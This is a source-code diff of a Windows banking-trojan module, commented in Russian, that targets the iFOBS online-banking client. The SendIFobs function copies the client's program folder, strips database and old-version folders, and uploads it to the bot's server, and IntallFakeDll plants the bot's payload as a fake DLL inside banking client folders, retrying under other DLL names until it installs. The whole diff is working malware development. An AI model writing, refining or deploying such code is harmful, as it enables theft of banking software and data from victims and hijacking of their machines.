@@ -494,40 +494,49 @@ DWORD WINAPI SendIFobs(LPVOID)
 {
 	BOT::Initialize(ProcessUnknown);
 	DBG( "IFobs", "запуск отсылки программы на сервер из папки %s", folderIFobs );
-	Bot->CreateFileA( 0, GetStr(IFobsFlagCopy).t_str() );
-	DWORD folderSize = 0;
+//	Bot->CreateFileA( 0, GetStr(IFobsFlagCopy).t_str() );
+//	DWORD folderSize = 0;
 //	if( !SizeFolderLess( folderIFobs, 1024*1024*350, &folderSize ) )
 //	{
 //		DBG( "IFobs", "Папка программы больше заданного размера, не копируем" );
 //		return 0;
 //	}
-	DBG( "IFobs", "Размер папки %d байт", folderSize );
-	char tempFolder[MAX_PATH];
+//	DBG( "IFobs", "Размер папки %d байт", folderSize );
+	char tempFolder[MAX_PATH], clientPrg[MAX_PATH];
+	m_memcpy( clientPrg, "Client_prg\\", 11 );
+	PathToName( folderIFobs, clientPrg + 11, sizeof(clientPrg) - 11 );
 	pGetTempPathA( sizeof(tempFolder), tempFolder );
-	char* cryptName = UIDCrypt::CryptFileName( "ifobs", false );
+	char* cryptName = UIDCrypt::CryptFileName( clientPrg + 11, false );
 	pPathAppendA( tempFolder, cryptName );
 	STR::Free(cryptName);
+	if( VideoProcess::FolderIsUpload( clientPrg, tempFolder ) )
+	{
+		DBG( "IFobs", "Эта папка на данный момент выкачивается" );
+		return 0;
+	}
 	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
 	pCreateDirectoryA( tempFolder, 0 );
 	DBG( "IFobs", "Копирование во временную папку %s", tempFolder );
 	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
 	*((int*)&(folderIFobs[ m_lstrlen(folderIFobs) ])) = 0; 
-	if( CopyFileANdFolder( folderIFobs, tempFolder ) )
+	CopyFileANdFolder( folderIFobs, tempFolder );
+	DBG( "IFobs", "Копирование на сервер" );
+	//удаляем ненужные папки
+	const char* DelFolders[] = { "DATA", "OldVersion", 0 };
+	int i = 0;
+	while( DelFolders[i] )
 	{
-		DBG( "IFobs", "Копирование на сервер" );
-		//удаляем папку с базой данных (она не нужна)
-		pPathAppendA( tempFolder, "DATA" );
+		pPathAppendA( tempFolder, DelFolders[i] );
 		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
 		DBG( "IFobs", "Удаление папки %s", tempFolder );
 		DeleteFolders(tempFolder);
-		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
 		pPathRemoveFileSpecA(tempFolder);
-		VideoProcess::SendFiles( 0, "Client_prg", tempFolder );
-		DeleteFolders(tempFolder);
-		DBG( "IFobs", "Копирование на сервер окончено" );
+		i++;
 	}
-	else
-		DBG( "IFobs", "Копирование в временную папку не удалось" );
+	VideoProcess::SendFiles( 0, clientPrg, tempFolder );
+	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
+	DeleteFolders(tempFolder);
+	DBG( "IFobs", "Копирование на сервер окончено" );
 	return 0;
 }
 
@@ -603,7 +612,7 @@ bool Init( const char* appName )
 
 static void FindExe(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel )
 {
-	DWORD hash = STR::GetHash(Search->cFileName,0,true);
+	DWORD hash = STR::GetHash(Search->cFileName, 0, true);
 	if( hash == PROCESS_HASH )
 	{
 		DBG( "IFobs", "Find %s", FileName );
@@ -733,11 +742,12 @@ DWORD WINAPI IntallFakeDll(void*)
 			for( int i = 0; i < clients.Count(); i++ )
 			{
 				m_lstrcpy( folderClient, clients[i].t_str() );
+				DWORD rand = (DWORD)pGetTickCount();
+				int n = rand % ARRAYSIZE(dlls);
 				for( int j = 0; j < 5; j++ ) //делаем 5 попыток установки, ошибка в инсталяции может быть из-за отсутствия нужной длл, на следующей попытке будет выбрана другая
 				{
 					pPathRemoveFileSpecA(folderClient);
-					DWORD rand = (DWORD)pGetTickCount();
-					pPathAppendA( folderClient, dlls[ rand % ARRAYSIZE(dlls) ] );
+					pPathAppendA( folderClient, dlls[n] );
 					m_memcpy( botData, bot.Data(), bot.Size() );
 					if( install( folderClient, botData, bot.Size()) )
 					{
@@ -746,7 +756,11 @@ DWORD WINAPI IntallFakeDll(void*)
 						break;
 					}
 					else
+					{
 						DBG("IFobs", "Инсталяция fake.dll для '%s' не выполнена", clients[i].t_str() );
+						n++;
+						if( n >= ARRAYSIZE(dlls) ) n = 0;
+					}
 				}
 			}
 			MemFree(botData);
